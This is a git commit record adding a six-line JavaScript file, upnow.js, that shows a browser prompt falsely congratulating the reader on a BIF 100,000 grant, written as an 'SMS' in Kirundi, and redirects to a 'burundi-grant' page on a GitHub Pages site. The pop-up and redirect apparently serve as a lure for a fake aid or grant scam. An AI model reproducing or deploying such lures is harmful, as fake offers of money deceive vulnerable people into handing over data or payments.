d7019cb89955d9258b159da52cb0a86385a4854b
everylinks <Joeyjosh60@gmail.com>
2024-12-18 15:51:34 +0100

    Create upnow.js

---
+++ upnow.js
@@ -0,0 +1,6 @@
+
+var password = 'BIF100,000'
+password=prompt('SMS :Congratulations Ushobora kwemererwa guhabwa (BIF100,000) infashanyo, Fyonda OK kugira ubone ivyawe  ','BIF100,000');
+if (password != 'BIF100,000') {
+location.href='https://everylinks.github.io/burundi-grant';
+}
